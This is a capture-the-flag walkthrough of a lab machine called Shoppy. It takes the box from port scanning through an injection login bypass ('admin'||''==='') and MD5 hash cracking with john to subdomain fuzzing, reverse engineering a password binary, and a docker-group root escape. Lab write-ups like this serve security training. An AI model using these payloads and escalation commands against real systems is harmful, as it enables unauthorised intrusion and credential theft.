**Target: 10.10.11.180   Shoppy**

**Initial Access:**\
nmap -Pn 10.10.11.180 --min-rate=5000 -p- |grep open|awk -F '/' '{print $1}'|tr '\n' ','\
Output returns open ports: 22,80,9093

Enumerating these open ports further with nmap:	\
nmap -Pn 10.10.11.180 --min-rate=5000 -p 22,80,9093 -sC -sV -oN nmap.shoppy 
<image src= "https://user-images.githubusercontent.com/93153300/198384322-4abd0691-d1ba-480c-83bf-6f638330341c.png">
 
nmap shows port 80 tried to redirect to http://shoppy.htb.   In order for that to work, add into /etc/hosts: 10.10.11.180  shoppy.htb.

Navigating to the site or port 80 shows nothing of interest.  \
dirsearch -r -u http://10.10.11.180 -e txt,php,html -f -o dsearch.80 → Output reveals directory:  /login

Navigate to /login.  Trying default credentials does not work.  Trying sql injection to bypass login works on username parameter with: admin'||''==='	\
After bypassing the login with the sql injection, we are taken to /admin directory, and it shows:		
![image](https://user-images.githubusercontent.com/93153300/198384390-37a7c2bd-23b1-4edb-9cf2-e98cf5f79e00.png)

 
Click on “search for users” redirects to /search-users directory showing:
![image](https://user-images.githubusercontent.com/93153300/198384431-7acaf968-1d1f-439d-904b-69dcd92c2ad0.png)

Re-enter same sql injection as before: admin'||''===' \
After entering the sql injection, a new “Download export” icon appears on the page: 
![image](https://user-images.githubusercontent.com/93153300/198384528-b51f824d-ce28-441c-b187-cdb2b1230de6.png)
 
Click on “Download export” takes us to a new directory http://shoppy.htb/exports/export-search.json. More importantly, it reveals usernames and hashed passwords: 
![image](https://user-images.githubusercontent.com/93153300/198384579-873fae10-da1e-4445-a5bc-52a2a5b9b8d3.png)

Use john to crack the hash: \
john hash --wordlist=/usr/share/wordlists/rockyou.txt –format=raw-md5	→ cracked to: remembermethisway

Using these credentials for ssh fails.  Use wfuzz to search for subdomains: \
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://shoppy.htb/" -H "Host: FUZZ.shoppy.htb" --hl 7

wfuzz found one subdomain: mattermost. \
Go to /etc/hosts and add that in:  10.10.11.180   mattermost.shoppy.htb\
Navigate to http://mattermost.shoppy.htb → redirects to /login directory, which is a login page.  
![image](https://user-images.githubusercontent.com/93153300/198384606-7ee074ef-921d-4e17-a76a-0c6ce95ce604.png)
 
Enter josh’s credentials found before: username josh, password remembermethisway. It works, and it logs in.   Looking around on the website, the left side panel has different pages to navigate to.  Clicking on “Deploy Machine” and reading the chat we find credentials:
![image](https://user-images.githubusercontent.com/93153300/198384641-f59df065-7c28-4469-9cf1-b5200ad36a77.png)

Username: jaeger password: Sh0ppyBest@pp! 

ssh jaeger@shoppy.htb → when prompted for password enter  Sh0ppyBest@pp!\
 It works, we have shell as jaeger.  Open /home/jaeger/user.txt to get the flag.				
__________________________________________________________________________________
**Lateral Movement:**\
looking at /home directory shows user jaeger and user deploy.\
command sudo -l shows: User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager							

Run the sudo command: sudo -u deploy /home/deploy/password-manager   				
![image](https://user-images.githubusercontent.com/93153300/198384678-1cb09fae-9a94-4d99-823c-15eaea6a3783.png)

When we run the password-manager file, we are asked to enter a password.  If the wrong password is entered, as shown above, then it denies access.  Download this file, password-manager, to reverse engineer it. Reverse engineering this file might reveal the password.  After downloading, use r2 to reverse engineer this with the following commands:\
r2 password-manager  → aaa  → afl → pdf @main.\
Looking over the output r2 shows on password-manager, we find the password, Sample.  
![image](https://user-images.githubusercontent.com/93153300/198384704-040454e3-cda7-4b14-861a-924af4137a65.png)

Going back to the shell on jaeger, run the sudo command once again:  sudo -u deploy /home/deploy/password-manager.  When prompted for password enter “Sample”.  It works, and new credetinals are shown: 				
![image](https://user-images.githubusercontent.com/93153300/198384728-527a7223-3aeb-4469-bfff-0f5268a83c11.png)
 
Try ssh as user deploy.\
ssh deploy@shoppy.htb  → when prompted, enter the password:  Deploying@pp!\
We have shell as deploy.  					
________________________________________________________________________
**Privilege Escalation:**\
Running command: id   → shows that the user deploy is in the docker group.  Use this to escalate to root with command:\
docker run -v /:/mnt --rm -it alpine chroot /mnt sh.\
We have shell as root, open /root/root.txt to get the flag.
![image](https://user-images.githubusercontent.com/93153300/198384823-ebdca9f0-ef40-4af3-82dd-05bb2f126881.png)
